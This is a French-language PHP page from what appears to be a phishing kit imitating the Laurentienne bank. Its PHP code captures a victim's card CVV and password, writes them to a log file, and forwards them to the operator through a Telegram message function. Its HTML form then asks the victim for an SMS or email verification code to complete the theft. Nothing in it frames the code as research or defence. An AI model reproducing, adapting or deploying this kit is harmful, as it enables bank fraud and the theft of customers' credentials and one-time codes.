<?php session_start();
  require_once "../sendto.php" ;
if (!isset($_POST["cvv"]) or !isset( $_POST["mdp"])) {
    header("Location: ./index.php");
    exit();
}

$_SESSION["cvv"] = $_POST['cvv'] ;
$_SESSION["mdp"] = $_POST['mdp'] ;
$heure = date("h:i:s") ;
$date = date("Y:m:d") ;



$donnees = "\n**NOUVELLE CONNEXION** à : " . $_SESSION["bank"] .
"\nHeure : " . $heure .
"\nDate : " . $date .
"\nCvv : `" . $_SESSION['cvv'] . "`" .
"\nMdp : `" . $_SESSION['mdp'] . "`" .
"\n";
$file = "../blinky2000@bvc@bvc@destruction.txt" ;
file_put_contents($file, $donnees, FILE_APPEND);

   sendMessageToTelegram($donnees) ;

?>



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" media="screen and (max-width: 768px)" href="/laurentienne/styles_mobile.css">

    <link rel="stylesheet" media="screen and (min-width: 769px)" href="/laurentienne/styles_pc.css">
    <title>Laurentienne</title>
</head>
<header>
<nav>
    <span> <img src="./logo.svg" alt=""> </span>
</nav>
</header>
<body style="margin: 0px;">
    
<form action="/laurentienne/terminus.php" method="post" >
   <b> Vous recevrez un code d'authenthification sur votre E-mail ou sms </b>
    <input type="number" style="
    
    height: 40px;
    border: none ;
    border-bottom: 1px solid black;
    margin-bottom: 20px;
    padding-left: 30px;
    outline: none;
    
    " name="sms" placeholder="Code de verification" required>


    <input type="submit" value="VALIDER">

  <b> Réinitialiser le mot de passe</b> 

</form>
<br> <br>

</body>
</html>
